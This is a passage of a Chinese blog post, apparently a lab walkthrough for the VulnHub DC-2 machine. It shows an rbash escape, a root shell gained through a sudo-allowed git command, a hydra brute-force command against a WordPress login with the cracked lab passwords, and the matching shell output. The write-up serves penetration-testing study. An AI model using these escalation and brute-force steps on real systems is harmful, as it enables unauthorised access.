+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> BASH_CMDS[a]=/bin/sh;a</span><br><span class="hljs-meta">#</span><span class="bash"> /bin/bash</span><br><span class="hljs-meta">#</span><span class="bash"> <span class="hljs-built_in">export</span> PATH=<span class="hljs-variable">$PATH</span>:/bin/</span><br><br>tom@DC-2:~$ cat flag3.txt<br>-rbash: cat: command not found<br>tom@DC-2:~$ BASH_CMDS[a]=/bin/sh;a<br><span class="hljs-meta">$</span><span class="bash"> /bin/bash</span><br>tom@DC-2:~$ cat flag3.txt<br>bash: cat: command not found<br>tom@DC-2:~$ export PATH=$PATH:/bin/<br>tom@DC-2:~$ cat flag3.txt<br>Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.<br></code></pre></td></tr></table></figure>
+<p>根据提示，在 <code>/home/jerry</code> 下找到 flag4：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">tom@DC-2:~$ ls /home/jerry<br>flag4.txt<br>tom@DC-2:~$ cat /home/jerry/flag4.txt<br>Good to see that you&#x27;ve made it this far - but you&#x27;re not home yet. <br>You still need to get the final flag (the only flag that really counts!!!).  <br>No hints here - you&#x27;re on your own now.  :-)<br>Go on - git outta here!!!!<br></code></pre></td></tr></table></figure>
+<h3 id="2、git-提权"><a href="#2、git-提权" class="headerlink" title="2、git 提权"></a>2、git 提权</h3><blockquote>
+<p><a target="_blank" rel="noopener" href="https://gtfobins.github.io/">GTFOBins</a></p>
+</blockquote>
+<p>尽管对 tom 的 shell 进行了绕过，但有些命令还是没有，加上提示中出现 Jerry，尝试切换到 Jerry 用户：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell">tom@DC-2:~$ su jerry<br>Password: <br>jerry@DC-2:/home/tom$ id<br>uid=1002(jerry) gid=1002(jerry) groups=1002(jerry)<br>jerry@DC-2:/home/tom$ sudo -l<br>Matching Defaults entries for jerry on DC-2:<br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin<br><br>User jerry may run the following commands on DC-2:<br>    (root) NOPASSWD: /usr/bin/git<br>jerry@DC-2:/home/tom$ <br><br></code></pre></td></tr></table></figure>
+<p>前面有提示 git ，加上可以使用 sudo 以 root 运行  git ，使用 git 进行提权：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs shell">jerry@DC-2:/home/tom$ sudo git -p help config<br>NAME<br>       git-config - Get and set repository or global options<br>......<br><br>!/bin/sh<br><span class="hljs-meta">#</span><span class="bash"> id</span><br>uid=0(root) gid=0(root) groups=0(root)<br><span class="hljs-meta">#</span><span class="bash"> </span><br><span class="hljs-meta">#</span><span class="bash"> whoami</span><br>root<br><span class="hljs-meta">#</span><span class="bash"> ls /root</span><br>final-flag.txt<br><span class="hljs-meta">#</span><span class="bash"> cat /root/final-flag.txt</span><br> __    __     _ _       _                    _ <br>/ / /\ \ \___| | |   __| | ___  _ __   ___  / \<br>\ \/  \/ / _ \ | |  / _` |/ _ \| &#x27;_ \ / _ \/  /<br> \  /\  /  __/ | | | (_| | (_) | | | |  __/\_/ <br>  \/  \/ \___|_|_|  \__,_|\___/|_| |_|\___\/   <br><br><br>Congratulatons!!!<br><br>A special thanks to all those who sent me tweets<br>and provided me with feedback - it&#x27;s all greatly<br>appreciated.<br><br>If you enjoyed this CTF, send me a tweet via @DCAU7.<br></code></pre></td></tr></table></figure>
+<h2 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h2><p>1、WordPress</p>
+<p>2、wpscan：枚举用户名、爆破</p>
+<p>3、cewl：根据站点生成密码字典</p>
+<p>4、SSH</p>
+<p>5、受限 Shell 的绕过，shell 提权</p>
+<p>6、git 提权</p>
+<h2 id="五、其他"><a href="#五、其他" class="headerlink" title="五、其他"></a>五、其他</h2><p><strong>使用 hydra 进行爆破：</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> hydra -L user.txt -P passwd.txt dc-2 http-form-post <span class="hljs-string">&#x27;/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log&amp;testcookie=1:S=LOcation&#x27;</span></span><br>[DATA] max 16 tasks per 1 server, overall 16 tasks, 714 login tries (l:3/p:238), ~45 tries per task<br>[DATA] attacking http-post-form://dc-2:80/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log&amp;testcookie=1:S=LOcation<br>[80][http-post-form] host: dc-2   login: jerry   password: adipiscing<br>[80][http-post-form] host: dc-2   login: tom   password: parturient<br>1 of 1 target successfully completed, 2 valid passwords found<br></code></pre></td></tr></table></figure>
+<p>表单：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!--http://dc-2/wp-admin ===&gt; http://dc-2/wp-login.php--&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;loginform&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;loginform&quot;</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://dc-2/wp-login.php&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span>&gt;</span><br>	<span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><br>		<span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;user_login&quot;</span>&gt;</span>Username or Email Address<span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br>		<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;log&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;user_login&quot;</span> <span class="hljs-attr">aria-describedby</span>=<span class="hljs-string">&quot;login_error&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;input&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;admin&quot;</span> <span class="hljs-attr">size</span>=<span class="hljs-string">&quot;20&quot;</span> /&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>	<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>	<span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><br>		<span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;user_pass&quot;</span>&gt;</span>Password<span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br>		<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;pwd&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;user_pass&quot;</span> <span class="hljs-attr">aria-describedby</span>=<span class="hljs-string">&quot;login_error&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;input&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">size</span>=<span class="hljs-string">&quot;20&quot;</span> /&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>	<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>		<span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;forgetmenot&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;rememberme&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;rememberme&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;checkbox&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;rememberme&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;forever&quot;</span>  /&gt;</span> Remember Me<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>	<span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;submit&quot;</span>&gt;</span><br>		<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;wp-submit&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;wp-submit&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;button button-primary button-large&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Log In&quot;</span> /&gt;</span><br>		<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;redirect_to&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;http://dc-2/wp-admin/&quot;</span> /&gt;</span><br>		<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;testcookie&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;1&quot;</span> /&gt;</span><br>	<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br></code></pre></td></tr></table></figure>
+<p><strong>查看目录信息：</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs shell">tom@DC-2:~$ ls -alhR /home<br>/home:<br>total 16K<br>drwxr-xr-x  4 root  root  4.0K Mar 21  2019 .<br>drwxr-xr-x 21 root  root  4.0K Mar 10  2019 ..<br>drwxr-xr-x  2 jerry jerry 4.0K Mar 21  2019 jerry<br>drwxr-x---  3 tom   tom   4.0K Jun 26 19:30 tom<br><br>/home/jerry:<br>total 28K<br>drwxr-xr-x 2 jerry jerry 4.0K Mar 21  2019 .<br>drwxr-xr-x 4 root  root  4.0K Mar 21  2019 ..<br>-rw------- 1 jerry jerry  333 Jun 26 20:30 .bash_history<br>-rw-r--r-- 1 jerry jerry  220 Mar 21  2019 .bash_logout<br>-rw-r--r-- 1 jerry jerry 3.5K Mar 21  2019 .bashrc<br>-rw-r--r-- 1 jerry jerry  223 Mar 21  2019 flag4.txt<br>-rw-r--r-- 1 jerry jerry  675 Mar 21  2019 .profile<br><br>/home/tom:<br>total 40K<br>drwxr-x--- 3 tom  tom  4.0K Jun 26 19:30 .<br>drwxr-xr-x 4 root root 4.0K Mar 21  2019 ..<br>-rwxr-x--- 1 tom  tom  1022 Jun 27 12:31 .bash_history<br>-rwxr-x--- 1 tom  tom    30 Mar 21  2019 .bash_login<br>-rwxr-x--- 1 tom  tom    30 Mar 21  2019 .bash_logout<br>-rwxr-x--- 1 tom  tom    30 Mar 21  2019 .bash_profile<br>-rwxr-x--- 1 tom  tom    30 Mar 21  2019 .bashrc<br>-rwxr-x--- 1 tom  tom    95 Mar 21  2019 flag3.txt<br>-rwxr-x--- 1 tom  tom    30 Mar 21  2019 .profile<br>drwxr-x--- 3 tom  tom  4.0K Mar 21  2019 usr<br><br>/home/tom/usr:<br>total 12K<br>drwxr-x--- 3 tom tom 4.0K Mar 21  2019 .<br>drwxr-x--- 3 tom tom 4.0K Jun 26 19:30 ..<br>drwxr-x--- 2 tom tom 4.0K Mar 21  2019 bin<br><br>/home/tom/usr/bin:<br>total 8.0K<br>drwxr-x--- 2 tom tom 4.0K Mar 21  2019 .<br>drwxr-x--- 3 tom tom 4.0K Mar 21  2019 ..<br>lrwxrwxrwx 1 tom tom   13 Mar 21  2019 less -&gt; /usr/bin/less<br>lrwxrwxrwx 1 tom tom    7 Mar 21  2019 ls -&gt; /bin/ls<br>lrwxrwxrwx 1 tom tom   12 Mar 21  2019 scp -&gt; /usr/bin/scp<br>lrwxrwxrwx 1 tom tom   11 Mar 21  2019 vi -&gt; /usr/bin/vi<br>You have new mail in /var/mail/tom<br></code></pre></td></tr></table></figure>
+<p><strong>绕 rbash：</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs shell">tom@DC-2:~$ cat flag3.txt<br>-rbash: cat: command not found<br><br>tom@DC-2:~$ export -p<br>declare -x HOME=&quot;/home/tom&quot;<br>declare -x LANG=&quot;en_US.UTF-8&quot;<br>declare -x LOGNAME=&quot;tom&quot;<br>declare -x MAIL=&quot;/var/mail/tom&quot;<br>declare -x OLDPWD<br>declare -rx PATH=&quot;/home/tom/usr/bin&quot;<br>declare -x PWD=&quot;/home/tom&quot;<br>declare -rx SHELL=&quot;/bin/rbash&quot;<br>declare -x SHLVL=&quot;1&quot;<br>declare -x SSH_CLIENT=&quot;192.168.135.141 52502 7744&quot;<br>declare -x SSH_CONNECTION=&quot;192.168.135.141 52502 192.168.135.148 7744&quot;<br>declare -x SSH_TTY=&quot;/dev/pts/0&quot;<br>declare -x TERM=&quot;xterm-256color&quot;<br>declare -x USER=&quot;tom&quot;<br><br>tom@DC-2:~$ BASH_CMDS[a]=/bin/sh;a<br><span class="hljs-meta">$</span><span class="bash"> /bin/bash</span><br>tom@DC-2:~$ cat flag3.txt<br>bash: cat: command not found<br>tom@DC-2:~$ /bin/cat flag3.txt<br>Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.<br><br>tom@DC-2:~$ export -p<br>declare -x HOME=&quot;/home/tom&quot;<br>declare -x LANG=&quot;en_US.UTF-8&quot;<br>declare -x LOGNAME=&quot;tom&quot;<br>declare -x MAIL=&quot;/var/mail/tom&quot;<br>declare -x OLDPWD<br>declare -x PATH=&quot;/home/tom/usr/bin&quot;<br>declare -x PWD=&quot;/home/tom&quot;<br>declare -x SHELL=&quot;/bin/rbash&quot;<br>declare -x SHLVL=&quot;2&quot;<br>declare -x SSH_CLIENT=&quot;192.168.135.141 52502 7744&quot;<br>declare -x SSH_CONNECTION=&quot;192.168.135.141 52502 192.168.135.148 7744&quot;<br>declare -x SSH_TTY=&quot;/dev/pts/0&quot;<br>declare -x TERM=&quot;xterm-256color&quot;<br>declare -x USER=&quot;tom&quot;<br><br>tom@DC-2:~$ export PATH=$PATH:/bin/<br>tom@DC-2:~$ export -p<br>declare -x HOME=&quot;/home/tom&quot;<br>declare -x LANG=&quot;en_US.UTF-8&quot;<br>declare -x LOGNAME=&quot;tom&quot;<br>declare -x MAIL=&quot;/var/mail/tom&quot;<br>declare -x OLDPWD<br>declare -x PATH=&quot;/home/tom/usr/bin:/bin/&quot;<br>declare -x PWD=&quot;/home/tom&quot;<br>declare -x SHELL=&quot;/bin/rbash&quot;<br>declare -x SHLVL=&quot;2&quot;<br>declare -x SSH_CLIENT=&quot;192.168.135.141 52502 7744&quot;<br>declare -x SSH_CONNECTION=&quot;192.168.135.141 52502 192.168.135.148 7744&quot;<br>declare -x SSH_TTY=&quot;/dev/pts/0&quot;<br>declare -x TERM=&quot;xterm-256color&quot;<br>declare -x USER=&quot;tom&quot;<br>declare -x VIM=&quot;/usr/share/vim&quot;<br>declare -x VIMRUNTIME=&quot;/usr/share/vim/vim74&quot;<br><br>tom@DC-2:~$ cat flag3.txt<br>Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.<br></code></pre></td></tr></table></figure>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/Penetration/">Penetration</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/Penetration/">Penetration</a>
+                    
+                      <a class="hover-with-bg" href="/tags/vulnhub/">vulnhub</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/06/30/Penetration/Vulnhub/Part-1/0x0E%20Corrosion-2/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Corrosion：2</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/06/27/Penetration/Vulnhub/Part-1/0x0A%20Raven-1/">
+                        <span class="hidden-mobile">Raven：1</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.3/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.1/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
